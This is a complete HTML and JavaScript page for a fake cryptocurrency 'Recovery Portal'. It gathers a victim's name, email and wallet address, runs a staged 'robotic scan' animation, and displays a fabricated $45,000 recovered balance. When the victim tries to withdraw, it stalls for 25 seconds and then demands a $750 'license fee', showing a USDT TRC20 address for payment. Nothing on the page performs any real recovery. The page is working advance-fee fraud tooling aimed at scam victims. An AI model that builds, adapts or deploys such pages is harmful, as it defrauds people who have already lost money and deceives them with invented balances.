<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Recovery Portal</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
  body {
    font-family: 'Inter', sans-serif;
    background: #0f0f0f;
    color: #fff;
    margin: 0;
  }
  .container {
    max-width: 420px;
    margin: auto;
    padding: 20px;
    text-align: center;
  }
  .card {
    background: linear-gradient(135deg,#1e1e1e,#2a2a2a);
    border-radius: 15px;
    padding: 20px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.5);
    margin-bottom: 20px;
  }
  .balance {
    font-size: 26px;
    font-weight: bold;
    margin-top: 10px;
  }
  .btn {
    display: block;
    width: 100%;
    padding: 15px;
    margin: 10px 0;
    background: #00ffc8;
    color: #000;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    font-size: 16px;
    transition: background 0.3s ease;
  }
  .btn:disabled {background:#444;color:#aaa;cursor:not-allowed;}
  .modal {
    position: fixed;top:0;left:0;width:100%;height:100%;
    background: rgba(0,0,0,0.9);
    display:none;justify-content:center;align-items:center;
    z-index:999;
  }
  .modal-content {
    background:#1e1e1e;padding:25px;border-radius:12px;text-align:center;
    max-width:340px;box-shadow:0 4px 12px rgba(0,0,0,0.3);
    animation: snookFade 0.6s ease;
  }
  @keyframes snookFade {
    from {opacity:0; transform:scale(0.95) translateY(20px);}
    to {opacity:1; transform:scale(1) translateY(0);}
  }
  input,select {
    width:100%;padding:10px;margin:8px 0;border-radius:8px;border:none;
    background:#2a2a2a;color:#fff;
  }
  /* Laser scan */
  .scan-area {
    position: relative;
    width: 100%;
    height: 100%;
    background: repeating-linear-gradient(
      to bottom,
      #111 0px,
      #111 20px,
      #0f0f0f 20px,
      #0f0f0f 40px
    );
    overflow: hidden;
  }
  .laser-line {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 4px;
    background: lime;
    box-shadow: 0 0 15px lime, 0 0 30px lime;
    animation: sweep 2s linear forwards;
  }
  @keyframes sweep {
    from {top:0;}
    to {top:100%;}
  }
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <h2 id="greeting">Welcome!</h2>
    <div class="balance" id="balance">‚Ç¨0.00</div>
  </div>
  <button class="btn" onclick="showRegistration()">Register</button>
  <button class="btn" onclick="startRecovery()" id="activateBtn" disabled>Activate Recovery</button>
  <button class="btn" onclick="claimRecovery()" id="claimBtn" disabled>Claim Recovery</button>
  <button class="btn" onclick="startWithdraw()" id="withdrawBtn" disabled>Withdraw</button>
</div>

<!-- Registration Modal -->
<div class="modal" id="regModal">
  <div class="modal-content">
    <h3>One-Time Registration</h3>
    <input type="text" id="fullName" placeholder="Full Name" required>
    <input type="email" id="email" placeholder="Email" required>
    <input type="text" id="wallet" placeholder="Wallet Address" required>
    <button class="btn" onclick="completeRegistration()">Confirm</button>
  </div>
</div>

<!-- Recovery Scan Modal -->
<div class="modal" id="scanModal">
  <div class="scan-area" id="laserArea"></div>
</div>

<!-- Recovery Result Modal -->
<div class="modal" id="resultModal">
  <div class="modal-content">
    <h3>Robotic Scan Review</h3>
    <p>Total Recovery Found: $45,000</p>
    <button class="btn" onclick="closeResult()">OK</button>
  </div>
</div>

<!-- Withdraw Modal -->
<div class="modal" id="withdrawModal">
  <div class="modal-content">
    <h3>Withdraw Funds</h3>
    <select id="currency">
      <option value="BTC">BTC</option>
      <option value="USDT">USDT</option>
      <option value="ETH">ETH</option>
    </select>
    <input type="text" id="withdrawAddress" placeholder="Wallet Address">
    <button class="btn" onclick="confirmWithdraw()">Confirm</button>
    <div id="withdrawStatus"></div>
  </div>
</div>

<!-- Fee Popup Modal -->
<div class="modal" id="feeModal">
  <div class="modal-content">
    <div style="font-size:40px; color:#00ffc8; margin-bottom:10px;">üõ°Ô∏è</div>
    <h3 style="color:#00ffc8; margin-top:0;">Recovery License Fee</h3>
    <p style="font-size:15px; line-height:1.6; color:#ddd;">
      To complete your recovery and unlock full withdrawal functionality, a one‚Äëtime
      <strong style="color:#fff;">license fee of $750</strong> is required.
    </p>
    <p style="font-size:14px; color:#00ffc8; margin-top:15px; font-weight:600;">
      ‚úÖ Once payment is confirmed, your recovery will be released immediately and funds will be available for withdrawal.
    </p>
    <p style="font-size:13px; color:#aaa; margin-top:10px;">
      This verification ensures compliance and secures your recovered funds.
    </p>
    <button class="btn" onclick="proceedFee()">Proceed to Payment</button>
    <button class="btn" style="background:#444; color:#fff;" onclick="closeFee()">Cancel</button>
  </div>
</div>

<script>
  const greeting=document.getElementById('greeting');
  const balance=document.getElementById('balance');
  const regModal=document.getElementById('regModal');
  const scanModal=document.getElementById('scanModal');
  const resultModal=document.getElementById('resultModal');
  const withdrawModal=document.getElementById('withdrawModal');
  const feeModal=document.getElementById('feeModal');
  const activateBtn=document.getElementById('activateBtn');
  const claimBtn=document.getElementById('claimBtn');
  const withdrawBtn=document.getElementById('withdrawBtn');
  const withdrawStatus=document.getElementById('withdrawStatus');

  function showRegistration(){regModal.style.display='flex';}
  function completeRegistration(){
    const name=document.getElementById('fullName').value;
    const email=document.getElementById('email').value;
    const wallet=document.getElementById('wallet').value;
    if(name && email && wallet){
      localStorage.setItem('userName',name);
      greeting.textContent=`Welcome, ${name}!`;
      regModal.style.display='none';
      activateBtn.disabled=false;
    }
  }

  function playBeep(){
    const ctx=new (window.AudioContext||window.webkitAudioContext)();
    const oscillator=ctx.createOscillator();
    const gainNode=ctx.createGain();
    oscillator.type="sine";
    oscillator.frequency.setValueAtTime(800,ctx.currentTime);
    gainNode.gain.setValueAtTime(0.1,ctx.currentTime);
    oscillator.connect(gainNode);
    gainNode.connect(ctx.destination);
    oscillator.start();
    oscillator.stop(ctx.currentTime+0.2);
  }

      function startRecovery(){
      scanModal.style.display='flex';
      let passes=0;
      const laserArea=document.getElementById('laserArea');
      laserArea.innerHTML='';
      function runLaser(){
        const laser=document.createElement('div');
        laser.className='laser-line';
        laserArea.appendChild(laser);
        playBeep();
        laser.addEventListener('animationend',()=>{
          laser.remove();
          passes++;
          if(passes<6){
            runLaser();
          } else {
            scanModal.style.display='none';
            resultModal.style.display='flex';
            claimBtn.disabled=false;
          }
        });
      }
      runLaser();
    }

    function closeResult(){
      resultModal.style.display='none';
    }

    function claimRecovery(){
      balance.textContent='$45,000.00';
      claimBtn.disabled=true;
      withdrawBtn.disabled=false;
    }

    function startWithdraw(){
      withdrawModal.style.display='flex';
    }

    function confirmWithdraw(){
      withdrawStatus.innerHTML='<p>Processing withdrawal...</p>';
      setTimeout(()=>{
        withdrawModal.style.display='none';
        showFeePopup();
      },25000);
    }

    function showFeePopup(){
      feeModal.style.display='flex';
    }

    function closeFee(){
      feeModal.style.display='none';
    }

    function proceedFee(){
      alert("USDT TRC20: TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa");
      // Integrate payment API or redirect here
    }

    window.onload=()=>{
      const name=localStorage.getItem('userName');
      if(name){
        greeting.textContent=`Welcome, ${name}!`;
        balance.textContent='‚Ç¨24,000.00';
        activateBtn.disabled=false;
      }
    };
  </script>
</body>
</html>

